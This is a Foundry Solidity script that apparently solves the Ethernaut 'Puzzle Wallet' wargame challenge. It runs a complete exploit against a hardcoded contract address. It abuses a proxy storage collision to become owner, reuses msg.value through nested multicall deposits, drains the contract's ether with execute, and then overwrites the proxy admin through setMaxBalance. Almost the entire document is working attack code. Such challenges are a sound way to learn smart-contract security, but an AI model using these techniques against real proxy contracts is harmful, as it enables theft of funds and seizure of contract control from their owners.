// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/PuzzleWallet.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract PuzzleWalletSol is Script {
    PuzzleProxy public pp_ = PuzzleProxy(payable(0x3B4dF0D50D91Dce6995d60869e9b886c938Bfcf7));
    PuzzleWallet public pw_ = PuzzleWallet(payable(0x3B4dF0D50D91Dce6995d60869e9b886c938Bfcf7));

    function run() external {
        vm.startBroadcast();

        console.log("Before pendingAdmin:   ", pp_.pendingAdmin());
        console.log("Before owner:          ", pw_.owner());
        pp_.proposeNewAdmin(msg.sender);
        console.log("Exected proposeNewAdmin");
        console.log("After  pendingAdmin:   ", pp_.pendingAdmin());
        console.log("After  owner:          ", pw_.owner());
        
        console.log("====================");
        console.log("Before whitelisted:    ", pw_.whitelisted(msg.sender));
        pw_.addToWhitelist(msg.sender);
        console.log("Exected addToWhitelist");
        console.log("After  whitelisted:    ", pw_.whitelisted(msg.sender));

        console.log("====================");
        console.log("Before balance:       ", address(pw_).balance);
        console.log("Before user balance:  ", pw_.balances(msg.sender));
        pw_.deposit{value: 0.001 ether}();
        console.log("Exected deposit");
        console.log("After balance:        ", address(pw_).balance);
        console.log("After user balance:   ", pw_.balances(msg.sender));

        console.log("====================");
        bytes[] memory data0 = new bytes[](1);
        data0[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSignature("deposit()");
        data[1] = abi.encodeWithSignature("multicall(bytes[])", data0);
        pw_.multicall{value: 0.001 ether}(data);
        console.log("Exected multicall deposit x2");
        console.log("After balance:        ", address(pw_).balance);
        console.log("After user balance:   ", pw_.balances(msg.sender));

        console.log("====================");
        pw_.execute(msg.sender, 0.003 ether, "");
        console.log("Exected execute to withdraw all");
        console.log("After balance:        ", address(pw_).balance);
        console.log("After user balance:   ", pw_.balances(msg.sender));

        console.log("====================");
        console.log("Before maxBalance:    ", address(uint160(pw_.maxBalance())));
        console.log("Before admin:         ", pp_.admin());
        pw_.setMaxBalance(uint256(uint160(msg.sender)));
        console.log("Exected setMaxBalance");
        console.log("After  maxBalance:    ", address(uint160(pw_.maxBalance())));
        console.log("After  admin:         ", pp_.admin());

        vm.stopBroadcast();
    }
}